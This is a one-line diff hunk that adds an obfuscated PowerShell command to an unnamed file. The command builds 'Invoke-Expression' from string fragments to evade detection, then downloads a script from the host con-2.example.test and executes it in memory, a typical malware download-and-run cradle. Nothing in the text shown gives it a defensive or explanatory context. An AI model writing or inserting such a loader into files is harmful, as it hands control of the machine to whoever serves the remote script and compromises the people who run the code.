@@ -1,0 +1,1 @@
+$c=('Inv'+'oke'+'-Ex'+'pression'); & $c ((New-Object Net.WebClient).DownloadString('http://con-2.example.test/l.ps1'))
